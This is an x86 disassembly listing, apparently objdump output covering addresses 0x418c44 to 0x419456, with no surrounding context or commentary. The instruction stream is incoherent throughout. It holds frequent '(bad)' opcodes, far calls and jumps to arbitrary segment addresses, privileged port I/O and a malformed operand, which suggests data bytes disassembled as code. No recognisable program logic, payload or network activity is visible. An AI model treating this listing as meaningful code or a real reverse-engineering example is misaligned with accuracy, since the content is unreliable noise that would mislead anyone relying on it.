  418c44:	mov    ds:0x81ae46c6,al
  418c49:	fnstsw WORD PTR [edi-0x63]
  418c4c:	push   edi
  418c4d:	cmp    al,0x98
  418c4f:	mov    ebx,0x8ecc5e3e
  418c54:	loopne 0x418bf9
  418c56:	cmp    DWORD PTR [ecx+0x34e40df1],edx
  418c5c:	dec    edx
  418c5d:	lock and eax,0xae685f75
  418c63:	add    BYTE PTR [ebp-0x3c4a6ec],bl
  418c69:	inc    ebp
  418c6a:	push   0x33
  418c6c:	(bad)  
  418c6d:	retf   
  418c6e:	push   esp
  418c6f:	dec    ecx
  418c70:	dec    ecx
  418c71:	and    eax,0xfd8e5833
  418c76:	xor    BYTE PTR ss:[edi+eiz*2],0xa7
  418c7b:	icebp  
  418c7c:	das    
  418c7d:	and    eax,0x868bf7ca
  418c82:	(bad)  
  418c84:	lahf   
  418c85:	clc    
  418c86:	std    
  418c87:	inc    esi
  418c88:	xchg   BYTE PTR [ecx-0x75],al
  418c8b:	outs   dx,DWORD PTR ds:[esi]
  418c8c:	pop    esi
  418c8d:	push   ebp
  418c8e:	sub    esp,DWORD PTR ds:0x8ae14ef7
  418c94:	push   eax
  418c95:	call   0xdebf:0x7297f1d8
  418c9c:	shr    BYTE PTR [ebp+0x30],cl
  418c9f:	inc    ecx
  418ca0:	or     BYTE PTR [edi],bh
  418ca2:	sbb    eax,0xb558ab44
  418ca7:	nop
  418ca8:	xor    al,0x3f
  418caa:	jnp    0x418c6c
  418cac:	test   BYTE PTR [edi+0x12],al
  418caf:	sar    DWORD PTR [eax-0x51],1
  418cb2:	push   ecx
  418cb3:	mov    WORD PTR [esi-0x10],gs
  418cb6:	in     al,dx
  418cb7:	adc    esp,edi
  418cb9:	inc    esp
  418cba:	push   esi
  418cbb:	pop    ebx
  418cbc:	jmp    0x418c74
  418cbe:	pop    ss
  418cbf:	int    0xad
  418cc1:	ss pop ebp
  418cc3:	mov    ebp,0xa0cfbb42
  418cc8:	sbb    BYTE PTR [ecx+0x3d],ah
  418ccb:	icebp  
  418ccc:	aam    0xa4
  418cce:	and    esp,DWORD PTR [edi]
  418cd0:	enter  0xcd6a,0x41
  418cd4:	es jge 0x418cb6
  418cd7:	mov    dh,0xc0
  418cd9:	dec    edx
  418cda:	sub    ah,BYTE PTR ss:[bp+si+0x6a9b]
  418ce0:	inc    ebx
  418ce1:	xchg   ebx,eax
  418ce2:	adc    DWORD PTR [edx-0x25],edx
  418ce5:	js     0x418c7e
  418ce7:	js     0x418c79
  418ce9:	or     al,0x91
  418ceb:	es push edi
  418ced:	popa   
  418cee:	stos   DWORD PTR es:[edi],eax
  418cef:	pop    edi
  418cf0:	ins    DWORD PTR es:[edi],dx
  418cf1:	pop    ebp
  418cf2:	mov    ebx,0x76c8a524
  418cf7:	(bad)  
  418cf8:	je     0x418d1a
  418cfa:	clc    
  418cfb:	pop    esi
  418cfc:	mov    edx,0xee7c2c92
  418d01:	addr16 ds mov esp,0x1cdd481e
  418d08:	mov    ecx,0xcae9b4ae
  418d0d:	mov    esi,0x751e658f
  418d12:	and    BYTE PTR [esi-0x4d],bh
  418d15:	mov    esp,0xefd36fad
  418d1a:	mov    ebp,esi
  418d1c:	mov    WORD PTR [esi+ecx*1-0x51],cs
  418d20:	mov    ch,0xb3
  418d22:	repz add BYTE PTR [edi-0x26],cl
  418d26:	push   edi
  418d27:	inc    edx
  418d28:	lods   al,BYTE PTR ds:[esi]
  418d29:	or     eax,0xe9235146
  418d2e:	push   esp
  418d2f:	loop   0x418d36
  418d31:	pop    es
  418d32:	mov    ds:0x8c8cdd44,al
  418d37:	adc    dl,al
  418d39:	out    dx,eax
  418d3a:	jle    0x418d6c
  418d3c:	jmp    0x418d94
  418d3e:	aas    
  418d3f:	dec    edi
  418d40:	mov    DWORD PTR [ebp-0x43],ebp
  418d43:	jno    0x418dae
  418d45:	ins    DWORD PTR es:[edi],dx
  418d46:	mov    dl,0x7a
  418d48:	inc    ecx
  418d49:	sub    ebx,DWORD PTR [ecx+0x47823a33]
  418d4f:	out    dx,eax
  418d50:	adc    eax,0xd7272001
  418d55:	and    eax,0x870ba9c
  418d5a:	ror    DWORD PTR [esp+edx*8],cl
  418d5d:	pop    esp
  418d5e:	scas   al,BYTE PTR es:[edi]
  418d5f:	pop    ecx
  418d60:	arpl   WORD PTR [edx],bp
  418d62:	clc    
  418d63:	retf   
  418d64:	inc    esp
  418d65:	add    al,0x30
  418d67:	imul   edx,ebp,0xdf94591e
  418d6d:	pop    ebx
  418d6e:	rol    DWORD PTR [ebx+0x79],1
  418d71:	fbstp  TBYTE PTR [esi-0x281d0471]
  418d77:	ins    DWORD PTR es:[edi],dx
  418d78:	jl     0x418d30
  418d7a:	ror    dh,cl
  418d7c:	test   BYTE PTR [edx+0x66],ch
  418d7f:	aam    0xfd
  418d81:	jmp    0xe5a1:0x9d6318b9
  418d88:	mov    eax,0xd765d451
  418d8d:	or     al,0xb
  418d8f:	add    DWORD PTR [eax+0x42f4513a],eax
  418d95:	mov    al,BYTE PTR [edx]
  418d97:	xor    BYTE PTR [edi+esi*1],0x1b
  418d9b:	bound  edx,QWORD PTR [esi+0x7b0007a0]
  418da1:	push   0x6c2f548c
  418da6:	dec    ecx
  418da7:	mov    DWORD PTR [edi-0x4f2f2891],0xd3a27c40
  418db1:	jecxz  0x418dde
  418db3:	jp     0x418d9d
  418db5:	dec    esp
  418db6:	test   eax,0x9eee84ee
  418dbb:	(bad)  
  418dbc:	mov    al,0x7b
  418dbe:	aas    
  418dbf:	stos   DWORD PTR es:[edi],eax
  418dc0:	ret    
  418dc1:	fwait
  418dc2:	push   ss
  418dc3:	jb     0x418d51
  418dc5:	cmp    esi,DWORD PTR [ebx]
  418dc7:	push   0xa687168c
  418dcc:	daa    
  418dcd:	ror    DWORD PTR ds:0x7f931443,0x7e
  418dd4:	xchg   esp,eax
  418dd5:	call   0xf441492b
  418dda:	push   ebp
  418ddb:	rcl    DWORD PTR [edx-0xdff3ed2],0x9b
  418de2:	pop    edi
  418de3:	(bad)  
  418de4:	daa    
  418de5:	fdiv   DWORD PTR [eax]
  418de7:	dec    eax
  418de8:	add    bl,cl
  418dea:	div    DWORD PTR [edi]
  418dec:	push   0xffffffa8
  418dee:	fstp   TBYTE PTR [edi]
  418df0:	call   0x57071129
  418df5:	mov    DWORD PTR [edi+edi*1-0x5d],edi
  418df9:	xor    eax,0xfbce7bed
  418dfe:	lods   eax,DWORD PTR ds:[esi]
  418dff:	in     al,0xe7
  418e01:	call   0xe184bc5f
  418e06:	pop    edi
  418e07:	xor    eax,0xc2ed4a81
  418e0c:	sub    al,0x6c
  418e0e:	rol    DWORD PTR ss:[esi],0xdc
  418e12:	cmp    BYTE PTR [ecx-0x7c],dh
  418e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e16:	push   eax
  418e17:	push   esi
  418e18:	call   0x7756a617
  418e1d:	push   0xa18ee16a
  418e22:	or     eax,0x375ca2d1
  418e27:	jnp    0x418e98
  418e29:	fisub  DWORD PTR [ebx]
  418e2b:	jl     0x418e6d
  418e2d:	push   cs
  418e2e:	pop    ebx
  418e2f:	fidiv  WORD PTR [edi-0x49]
  418e32:	iret   
  418e33:	sti    
  418e34:	jbe    0x418eb5
  418e36:	mov    esi,0x9b304377
  418e3b:	pop    esi
  418e3c:	repz sbb eax,0x5a014ac
  418e42:	mov    eax,ds:0x8345adbc
  418e47:	mov    cl,0xed
  418e49:	xor    DWORD PTR [esi-0x32aedfa9],ebx
  418e4f:	add    eax,0x9fae179
  418e54:	push   ss
  418e55:	xor    BYTE PTR [eax-0x57],ch
  418e58:	in     eax,0x20
  418e5a:	aaa    
  418e5b:	cs dec eax
  418e5d:	(bad)  
  418e5e:	or     BYTE PTR ss:[edi-0x7b312bd],0x98
  418e66:	test   BYTE PTR ds:0x12fb18c6,dh
  418e6c:	ss cmp ah,ah
  418e6f:	out    dx,al
  418e70:	std    
  418e71:	inc    ebx
  418e72:	arpl   bx,bp
  418e74:	mov    ds:0x852822c3,al
  418e79:	jp     0x418ee7
  418e7b:	pop    ds
  418e7c:	aam    0xa3
  418e7e:	sbb    esp,DWORD PTR [edi]
  418e80:	fwait
  418e81:	icebp  
  418e82:	cmp    eax,0x7626fd16
  418e87:	push   cs
  418e88:	(bad)  
  418e89:	aam    0x17
  418e8b:	pop    ds
  418e8c:	divps  xmm7,XMMWORD PTR ds:0xd3f1e58f
  418e93:	cmp    eax,0x34e6b63c
  418e98:	mov    ecx,0x16ed4984
  418e9d:	fld    QWORD PTR [eax]
  418e9f:	inc    edx
  418ea0:	shr    DWORD PTR [edx+0x742eb9ab],1
  418ea6:	std    
  418ea7:	sbb    edi,DWORD PTR [eax]
  418ea9:	xchg   ebx,eax
  418eaa:	out    0x26,al
  418eac:	pop    esp
  418ead:	push   ds
  418eae:	rcr    DWORD PTR [edi+0x76],cl
  418eb1:	(bad)  
  418eb2:	mov    ebp,DWORD PTR cs:[ebp-0x2d]
  418eb6:	retf   0x902a
  418eb9:	inc    ebp
  418eba:	sahf   
  418ebb:	dec    edx
  418ebc:	ror    BYTE PTR [eax+0x77be7f88],1
  418ec2:	(bad)  
  418ec3:	sbb    BYTE PTR gs:[bp+si+0x68c7],dh
  418ec9:	mov    al,0xc1
  418ecb:	outs   dx,BYTE PTR ds:[esi]
  418ecc:	fdivrp st(6),st
  418ece:	test   DWORD PTR [esi-0x39],edx
  418ed1:	mov    al,ds:0xb8f9ee4d
  418ed6:	xchg   esi,eax
  418ed7:	sub    al,0xf5
  418ed9:	pop    eax
  418eda:	adc    bl,BYTE PTR [esi+0x152438e0]
  418ee0:	imul   esi,DWORD PTR [edx],0x46
  418ee3:	daa    
  418ee4:	in     al,0x0
  418ee6:	imul   esi,DWORD PTR [ebx-0x50],0xffffffdc
  418eea:	dec    ebp
  418eeb:	je     0x418eee
  418eed:	int    0x65
  418eef:	ins    BYTE PTR es:[edi],dx
  418ef0:	iret   
  418ef1:	inc    esi
  418ef2:	mov    ds:0x140f6db8,al
  418ef7:	inc    eax
  418ef8:	loop   0x418f49
  418efa:	sub    dl,ch
  418efc:	prefetch BYTE PTR [esi+0x11]
  418f00:	aas    
  418f01:	mov    gs,WORD PTR [edx]
  418f03:	sbb    bl,BYTE PTR [ecx+ebp*4-0x33]
  418f07:	push   ds
  418f08:	nop
  418f09:	cmp    esi,DWORD PTR [ebp+0x68481695]
  418f0f:	adc    al,0xd7
  418f11:	test   al,0xfb
  418f13:	loope  0x418f04
  418f15:	xchg   ebp,eax
  418f16:	out    0x29,al
  418f18:	pusha  
  418f19:	inc    edx
  418f1a:	jnp    0x418f4a
  418f1c:	mov    ch,0x8f
  418f1e:	xchg   BYTE PTR [ebx-0x37],al
  418f21:	sub    DWORD PTR [ebp-0x25a1aa5],ebp
  418f27:	jmp    0x2646:0xb975d06d
  418f2e:	neg    ah
  418f30:	mov    WORD PTR [edx+0x1f1cac54],ds
  418f36:	pop    esp
  418f37:	sub    DWORD PTR [edi+0x11],ebx
  418f3a:	aam    0xa5
  418f3c:	sbb    BYTE PTR [edi+0x4040466a],ah
  418f42:	fistp  DWORD PTR [ebp-0x71]
  418f45:	fisttp WORD PTR [eax-0x48]
  418f48:	sbb    esp,esp
  418f4a:	cdq    
  418f4b:	jb     0x418ee5
  418f4d:	jmp    0xf8cd240d
  418f52:	push   0xff4d70a1
  418f57:	xchg   DWORD PTR [ebp+0x78],esi
  418f5a:	call   0x4fc2a9fe
  418f5f:	jne    0x418ee6
  418f61:	and    eax,0x286cd1ca
  418f66:	mov    ecx,DWORD PTR [ebx-0x116d40b5]
  418f6c:	pushf  
  418f6d:	jne    0x418f7a
  418f6f:	and    ebp,DWORD PTR [eax+0x7119c94b]
  418f75:	stos   BYTE PTR es:[edi],al
  418f76:	jno    0x418f54
  418f78:	xchg   DWORD PTR [edi-0x7f],edx
  418f7b:	pop    eax
  418f7c:	push   ds
  418f7d:	fist   WORD PTR [edi+0x6421d091]
  418f83:	xor    esi,DWORD PTR [esi]
  418f85:	mov    ch,0xcd
  418f87:	inc    ebp
  418f88:	push   ss
  418f89:	pop    ss
  418f8a:	push   ax
  418f8c:	call   0x72c3:0x51eba060
  418f93:	nop
  418f94:	int3   
  418f95:	xchg   ebx,eax
  418f96:	mov    eax,0x44b23487
  418f9b:	outs   dx,DWORD PTR ds:[esi]
  418f9c:	arpl   WORD PTR [eax+0x4e0bc291],sp
  418fa2:	jae    0x418ffa
  418fa4:	daa    
  418fa5:	ret    0x1202
  418fa8:	call   0xd492d24b
  418fad:	fistp  WORD PTR [ebx]
  418faf:	xchg   edx,eax
  418fb0:	xchg   ebp,eax
  418fb1:	adc    eax,0x2820c71d
  418fb6:	test   BYTE PTR [esp+ecx*4],dh
  418fb9:	loopne 0x419003
  418fbb:	(bad)  
  418fbc:	adc    BYTE PTR [esi+ebx*2],dh
  418fbf:	mov    al,0x33
  418fc1:	mov    al,ds:0xf0be0d04
  418fc6:	mov    DWORD PTR [ebx],ebx
  418fc8:	jns    0x418f62
  418fca:	fcomip st,st(5)
  418fcc:	dec    eax
  418fcd:	cmp    eax,0xc7a9985e
  418fd2:	mov    al,0x11
  418fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd5:	and    esi,DWORD PTR [ebx-0x12]
  418fd8:	adc    ebp,esi
  418fda:	fs push 0x2b46c95e
  418fe0:	push   ebp
  418fe1:	dec    edi
  418fe3:	ja     0x418fb8
  418fe5:	add    al,0x3
  418fe7:	mov    edx,0x2eb6db5f
  418fec:	jge    0x418fef
  418fee:	sbb    al,0x40
  418ff0:	aaa    
  418ff1:	call   0x5474:0x28d92edf
  418ff8:	jge    0x418fd1
  418ffa:	push   cs
  418ffb:	mov    edi,0xa6c7b11
  419000:	lds    ebp,FWORD PTR [eax]
  419002:	das    
  419003:	loopne 0x418fd7
  419005:	(bad)  
  419006:	(bad)  
  419007:	ret    0xd2b8
  41900a:	outs   dx,BYTE PTR ds:[esi]
  41900b:	sub    ecx,DWORD PTR ds:0x22dbfa95
  419011:	fcom   QWORD PTR [ebx-0x6d]
  419014:	fadd   st(2),st
  419016:	aaa    
  419017:	push   ebx
  419018:	and    eax,0x286039c2
  41901d:	xor    eax,0xb37918e8
  419022:	mov    WORD PTR [ecx-0x33],ds
  419025:	push   ss
  419026:	in     eax,0xa8
  419028:	or     eax,0x6ce9daa9
  41902d:	lds    ebp,FWORD PTR [ebp-0x69]
  419030:	push   ds
  419031:	ja     0x41909f
  419033:	(bad)  
  419035:	pop    esi
  419036:	or     dl,BYTE PTR [ebx+edx*4]
  419039:	dec    esi
  41903a:	pop    ecx
  41903b:	xor    eax,DWORD PTR [ebx]
  41903d:	jne    0x41904b
  41903f:	pop    eax
  419040:	add    DWORD PTR [edi],esp
  419042:	sbb    esi,DWORD PTR [eax]
  419044:	adc    dl,BYTE PTR [edx-0x6682bc7d]
  41904a:	imul   DWORD PTR [ebx]
  41904c:	jmp    0xb838b991
  419051:	pop    esp
  419052:	inc    eax
  419053:	xor    al,0x3
  419055:	add    BYTE PTR [eax],ch
  419057:	bound  eax,QWORD PTR [ebx-0x13]
  41905a:	mov    esp,0xc28c7561
  41905f:	rol    DWORD PTR [esi+0x5d],0xa9
  419063:	jg     0x419022
  419065:	add    ch,BYTE PTR [ebx-0x33]
  419068:	js     0x4190e3
  41906a:	leave  
  41906b:	bound  ecx,QWORD PTR cs:[edx-0xc]
  41906f:	pop    esi
  419070:	jne    0x41903c
  419072:	out    0x68,al
  419074:	pop    esp
  419075:	in     eax,dx
  419076:	stos   DWORD PTR es:[edi],eax
  419077:	popf   
  419078:	mov    dh,0x3d
  41907a:	jae    0x41906e
  41907c:	pop    ecx
  41907d:	mov    ss,WORD PTR [esi]
  41907f:	or     ebp,DWORD PTR [edx-0x709df0f7]
  419085:	xor    eax,0xad5a53d3
  41908a:	inc    eax
  41908b:	das    
  41908c:	test   DWORD PTR ds:0xe025bf16,esp
  419092:	push   ebp
  419093:	fstp   TBYTE PTR [ecx-0x165845ec]
  419099:	(bad)  
  41909a:	sub    al,0x8b
  41909c:	add    al,0xf9
  41909e:	mov    BYTE PTR [esi-0x62],ah
  4190a1:	adc    al,0x90
  4190a3:	(bad)  
  4190a4:	int    0x89
  4190a6:	mov    BYTE PTR [edi+eiz*1-0xbc46c93],ch
  4190ad:	loop   0x419039
  4190af:	and    dh,BYTE PTR [ebp+0x34]
  4190b2:	stc    
  4190b3:	sub    al,0x22
  4190b5:	imul   ebp,DWORD PTR [edx-0x53],0x94320aab
  4190bc:	jnp    0x4190c9
  4190be:	gs inc ebp
  4190c0:	jg     0x41912c
  4190c2:	shr    BYTE PTR [ecx+0x47a1321b],0x4c
  4190c9:	pop    ebp
  4190ca:	(bad)  
  4190cb:	out    0xf7,al
  4190cd:	das    
  4190ce:	lock std 
  4190d0:	ficomp WORD PTR [edx+0x3e]
  4190d3:	xor    bh,bh
  4190d5:	stos   DWORD PTR es:[edi],eax
  4190d6:	or     cl,bl
  4190d8:	ret    0xb6d4
  4190db:	test   DWORD PTR [ebp-0x33],0x36e18e9
  4190e2:	xor    eax,0x68db14f3
  4190e7:	je     0x419080
  4190e9:	out    0x58,al
  4190eb:	mov    ds:0x623716ee,eax
  4190f0:	add    eax,0x2ed358d9
  4190f5:	loopne 0x419132
  4190f7:	cmp    ecx,DWORD PTR [ebx]
  4190f9:	or     esi,DWORD PTR [ebx+ebx*2]
  4190fc:	or     ah,dl
  4190fe:	xor    al,0x70
  419100:	sti    
  419101:	push   ebp
  419102:	pop    esp
  419103:	iret   
  419104:	jp     0x419145
  419106:	cmp    al,0xc6
  419108:	fiadd  DWORD PTR [esi+0x32e317e6]
  41910e:	std    
  41910f:	lods   al,BYTE PTR ds:[esi]
  419110:	jo     0x419170
  419112:	add    bl,BYTE PTR [esi]
  419114:	push   esi
  419115:	dec    ecx
  419116:	dec    ebp
  419117:	pusha  
  419118:	jnp    0x41910c
  41911a:	mov    dl,0x7b
  41911c:	sub    BYTE PTR [edx],0xc7
  41911f:	mov    esp,0x58596fc7
  419124:	cmp    cl,cl
  419126:	je     0x4190d5
  419128:	cmp    BYTE PTR [ecx+0x481a780a],ah
  41912e:	dec    ecx
  41912f:	mov    dl,0xd4
  419131:	and    al,0x12
  419133:	outs   dx,BYTE PTR ds:[esi]
  419134:	sbb    BYTE PTR [ebx+0x52],0x8
  419138:	xchg   edx,eax
  419139:	xchg   ebp,eax
  41913a:	xor    DWORD PTR [ebx+0x52f94d3a],0xe1ac35aa
  419144:	mul    DWORD PTR [ebx+0x31c4ce16]
  41914a:	or     BYTE PTR [ebp+0x4a],cl
  41914d:	xor    DWORD PTR [esi],ebp
  41914f:	sahf   
  419150:	jbe    0x419182
  419152:	cmp    BYTE PTR [edi],bl
  419154:	into   
  419155:	inc    ebx
  419156:	stc    
  419157:	adc    BYTE PTR [ebx+0x69ed912e],dh
  41915d:	cwde   
  41915e:	adc    DWORD PTR [ebx+0xcd5d712],ecx
  419164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419165:	test   ch,0xf0
  419168:	into   
  419169:	mov    edi,0x11275394
  41916e:	xchg   edx,eax
  41916f:	je     0x41912c
  419171:	push   ds
  419172:	push   eax
  419173:	ret    0x4c5e
  419176:	or     al,0x39
  419178:	in     al,dx
  419179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41917a:	dec    ecx
  41917b:	push   esp
  41917c:	and    cl,0x5a
  41917f:	mov    edi,0xbace0fec
  419184:	add    ebx,ebp
  419186:	ss inc ebp
  419188:	sti    
  419189:	mov    bh,0x3d
  41918b:	pop    edi
  41918c:	scas   eax,DWORD PTR es:[edi]
  41918d:	daa    
  41918e:	cli    
  41918f:	jne    0x4191d6
  419191:	sub    dl,BYTE PTR ds:0x3f1ebde9
  419197:	sar    DWORD PTR [edi+0x5e],0xaa
  41919b:	adc    al,0xee
  41919d:	and    BYTE PTR [ecx-0x2d],bl
  4191a0:	call   0x331d45d8
  4191a5:	inc    edx
  4191a6:	pop    ss
  4191a7:	js     0x4191c0
  4191a9:	imul   esp,DWORD PTR [ebx+0x35],0xffffffc1
  4191ad:	or     edx,edi
  4191af:	cmp    dh,BYTE PTR [eax-0xbf91749]
  4191b5:	dec    ebx
  4191b6:	imul   ebx,DWORD PTR [eax],0xfc6a0865
  4191bc:	inc    ebp
  4191bd:	cmp    DWORD PTR [ecx],esi
  4191bf:	icebp  
  4191c0:	pop    edi
  4191c1:	popf   
  4191c2:	cmp    BYTE PTR [eax+0x781d5dce],0x87
  4191c9:	sahf   
  4191ca:	out    dx,al
  4191cb:	stos   BYTE PTR es:[edi],al
  4191cc:	push   0xffffff9c
  4191ce:	xchg   edi,eax
  4191cf:	in     eax,0x62
  4191d1:	dec    ecx
  4191d2:	mov    ecx,0xc0b632e8
  4191d7:	jne    0x419204
  4191d9:	mov    edi,0x88b6c13
  4191de:	inc    ecx
  4191df:	add    eax,0x34574871
  4191e4:	mov    BYTE PTR [ebp-0x55],dh
  4191e7:	out    0x99,eax
  4191e9:	mov    bl,0xc1
  4191eb:	adc    dl,BYTE PTR [ebp+ecx*1+0x42]
  4191ef:	xchg   esp,esp
  4191f1:	scas   eax,DWORD PTR es:[edi]
  4191f2:	in     eax,dx
  4191f3:	ds cmp al,0x4f
  4191f6:	mov    esi,0xe9d5c2fc
  4191fb:	or     eax,0xd0e1c00d
  419200:	mov    bh,0x84
  419202:	leave  
  419203:	push   ebx
  419204:	cmp    eax,0x46b24314
  419209:	jae    0x419261
  41920b:	sti    
  41920c:	sbb    BYTE PTR [eax+0x2ce5e447],0x25
  419213:	or     BYTE PTR [eax],dh
  419215:	pop    esi
  419216:	sub    al,0x72
  419218:	out    0xb6,eax
  41921a:	loop   0x419242
  41921c:	add    ch,BYTE PTR [eax]
  41921e:	pop    edi
  41921f:	adc    edi,DWORD PTR [edx]
  419221:	in     eax,dx
  419222:	rol    dh,0x72
  419225:	mov    eax,ds:0x7e2bae27
  41922a:	das    
  41922b:	mov    ch,0x80
  41922d:	mov    ds:0xf5794a61,eax
  419232:	(bad)  
  419233:	xor    esp,DWORD PTR [edx-0x7c45a75b]
  419239:	rol    BYTE PTR [ebx-0x64507219],cl
  41923f:	sub    DWORD PTR [ebp-0x8e570f9],0xfffffffb
  419246:	mov    ds:0xe96ffc92,eax
  41924b:	test   eax,0x6221c55b
  419250:	xor    DWORD PTR [edi+0x619cb814],0xffffff97
  419257:	mov    WORD PTR [ecx+0x7d11ed70],es
  41925d:	or     esp,0xf00e1c3d
  419263:	movzx  edx,BYTE PTR [ecx-0x262bd6c2]
  41926a:	push   edi
  41926b:	mul    BYTE PTR [edx-0xb]
  41926e:	xchg   ecx,eax
  41926f:	jmp    0x67af:0xbbb4b223
  419276:	nop
  419277:	push   DWORD PTR [edx+0x742dfa70]
  41927d:	ss retf 0x4d04
  419281:	lods   al,BYTE PTR ds:[esi]
  419282:	add    eax,0xae83be20
  419287:	jbe    0x4192fc
  419289:	jg     0x4192a4
  41928b:	in     eax,0xba
  41928d:	or     BYTE PTR [eax-0x52],ah
  419290:	scas   al,BYTE PTR es:[edi]
  419291:	retf   0xe167
  419294:	scas   eax,DWORD PTR es:[edi]
  419295:	sub    esp,DWORD PTR [edi+0x5a]
  419298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419299:	mov    edx,0x66401f0a
  41929e:	sbb    al,0xcd
  4192a0:	mov    ?,WORD PTR [eax+0x7b]
  4192a3:	(bad)  
  4192a4:	ss xchg esi,eax
  4192a6:	jne    0x41924d
  4192a8:	mov    ebx,0x126b13e4
  4192ad:	jb     0x419232
  4192af:	aas    
  4192b0:	(bad)  
  4192b1:	jmp    0x11452d05
  4192b6:	pop    sp
  4192b8:	xor    al,0x63
  4192ba:	push   edi
  4192bb:	mov    dh,0xba
  4192bd:	sbb    al,bh
  4192bf:	mov    ds,WORD PTR [edx]
  4192c1:	call   0x2ab3:0xa9b5a6c
  4192c8:	std    
  4192c9:	pop    ecx
  4192ca:	sti    
  4192cb:	adc    DWORD PTR [eax+0x60798545],ecx
  4192d1:	sub    bl,BYTE PTR [ebp-0x450a0302]
  4192d7:	aad    0x7c
  4192d9:	imul   ecx,DWORD PTR [ecx],0xffffffb4
  4192dc:	add    BYTE PTR [edi-0x28],dh
  4192df:	ja     0x4192fb
  4192e1:	jecxz  0x419271
  4192e3:	adc    BYTE PTR [edx+0x20],ah
  4192e6:	out    dx,eax
  4192e7:	sub    al,0x1a
  4192e9:	daa    
  4192ea:	adc    al,0x3a
  4192ec:	jns    0x41933f
  4192ee:	test   eax,0x762413b2
  4192f3:	jne    0x419357
  4192f5:	(bad)  
  4192f6:	les    ecx,FWORD PTR [edi-0x7af088d4]
  4192fc:	xor    DWORD PTR [ecx],ecx
  4192fe:	rol    BYTE PTR cs:[eax+0x598fb174],0x92
  419306:	pop    ds
  419307:	popa   
  419308:	mov    esp,0x84a86d5d
  41930d:	fcos   
  41930f:	sub    al,0x58
  419311:	mov    eax,ds:0x9c3e33ef
  419316:	sbb    DWORD PTR [eax-0x79],ecx
  419319:	pop    edi
  41931a:	jnp    0x4192f5
  41931c:	mov    edi,0x25f745de
  419321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419322:	(bad)  
  419323:	(bad)  
  419324:	sub    DWORD PTR [ecx-0x40],esi
  419327:	add    BYTE PTR [edi],0x4f
  41932a:	sar    BYTE PTR [ecx+edi*2+0x5c0ccdd5],cl
  419331:	xchg   esi,eax
  419333:	or     al,0xe6
  419335:	and    BYTE PTR [eax],cl
  419337:	jns    0x4192d7
  419339:	jmp    0xc2846e61
  41933e:	lahf   
  41933f:	addr16 cdq 
  419341:	push   es
  419342:	out    dx,al
  419343:	call   0xe230c21d
  419348:	mov    BYTE PTR [ebp+0x1b],ch
  41934b:	inc    ebp
  41934c:	xor    al,0x3d
  41934e:	test   ebp,ecx
  419350:	cld    
  419351:	mov    ds:0xd48cf0b7,eax
  419356:	retf   
  419357:	int    0x93
  419359:	pushf  
  41935a:	imul   esp,DWORD PTR [ebp+0x30],0x4c6f2f00
  419361:	sti    
  419362:	pmaxsw mm1,QWORD PTR [ebx-0x6b]
  419366:	data16 mov dl,0x64
  419369:	mov    ch,BYTE PTR [esi-0x8a663bc]
  41936f:	in     al,dx
  419370:	mov    ebp,ebp
  419372:	mov    dh,0xec
  419374:	aad    0x72
  419376:	sub    BYTE PTR [esi-0x16dc2e39],0xbe
  41937d:	jge    0x4193c8
  41937f:	ret    0xf5b3
  419382:	sbb    al,0x15
  419384:	cmp    BYTE PTR [ecx+ebp*4+0x42],ah
  419388:	mov    al,ds:0xa69b4478
  41938d:	mov    cl,0x63
  41938f:	mov    bh,0x47
  419391:	pxor   mm5,QWORD PTR [ecx-0x29]
  419395:	lods   al,BYTE PTR fs:[esi]
  419397:	cs jmp 0x419332
  41939a:	xlat   BYTE PTR ds:[ebx]
  41939b:	adc    bl,BYTE PTR [eax+0x2a865926]
  4193a1:	push   0x4b
  4193a3:	into   
  4193a4:	fist   WORD PTR [ebx]
  4193a6:	xchg   ebx,eax
  4193a7:	push   esp
  4193a8:	mov    esi,0x50a6c951
  4193ad:	pop    ebp
  4193ae:	ror    BYTE PTR [edx+0x2c6e5d1],0xbf
  4193b5:	mov    ah,0x29
  4193b7:	xor    edi,eax
  4193b9:	not    DWORD PTR [eax+0x62b82f45]
  4193bf:	ds cli 
  4193c1:	mov    edx,0x173c5e0a
  4193c6:	xchg   esp,eax
  4193c7:	xor    al,0x6f
  4193c9:	or     dh,BYTE PTR [ecx+0x1e377789]
  4193cf:	(bad)  
  4193d0:	xchg   edx,eax
  4193d1:	popa   
  4193d2:	repnz or BYTE PTR [eax],ah
  4193d5:	into   
  4193d6:	adc    DWORD PTR [ebx+ecx*1],esp
  4193d9:	xor    al,0x4b
  4193db:	adc    eax,0x967e2e94
  4193e0:	stos   BYTE PTR es:[edi],al
  4193e1:	int    0x49
  4193e3:	xchg   DWORD PTR [eax-0x38],ebp
  4193e6:	mov    esi,0x6401c0d9
  4193eb:	nop
  4193ec:	xor    al,0xa1
  4193ee:	mov    esp,0x3b947b9b
  4193f3:	add    eax,0xf88e60b7
  4193f8:	data16 or al,0x20
  4193fb:	pop    edx
  4193fc:	lods   eax,DWORD PTR ds:[esi]
  4193fd:	lea    esi,[ebx+0x4103aae0]
  419403:	xor    edx,edx
  419405:	scas   eax,DWORD PTR es:[edi]
  419406:	rol    edx,0xfa
  419409:	and    al,al
  41940b:	xchg   edi,eax
  41940c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41940d:	out    0xc7,al
  41940f:	mov    es,esp
  419411:	push   es
  419412:	pop    ss
  419413:	icebp  
  419414:	ja     0x4193e8
  419416:	sub    al,0x1b
  419418:	or     bl,BYTE PTR [ebx]
  41941a:	lods   al,BYTE PTR ds:[esi]
  41941b:	jno    0x4193a1
  41941d:	int    0xab
  41941f:	mov    al,ds:0xb986c03b
  419424:	outs   dx,DWORD PTR ds:[esi]
  419425:	fild   WORD PTR [ebx+edi*8]
  419428:	fisubr DWORD PTR [esi-0x2d]
  41942b:	daa    
  41942c:	daa    
  41942d:	sahf   
  41942e:	mov    eax,0xd186450a
  419433:	nop
  419434:	mov    ah,0x32
  419436:	adc    BYTE PTR [ebx-0x238c479a],ah
  41943c:	ror    DWORD PTR ds:0x884fcfd,0x16
  419443:	inc    ebp
  419444:	adc    ah,cl
  419446:	adc    eax,0xa1ebea79
  41944b:	inc    DWORD PTR [edi+0x42]
  41944e:	mov    ah,0x86
  419450:	pop    edi
  419451:	test   eax,0xb7c7d47e
  419456:	sbb    DWORD PTR [ecx+0x248100ca],ecx
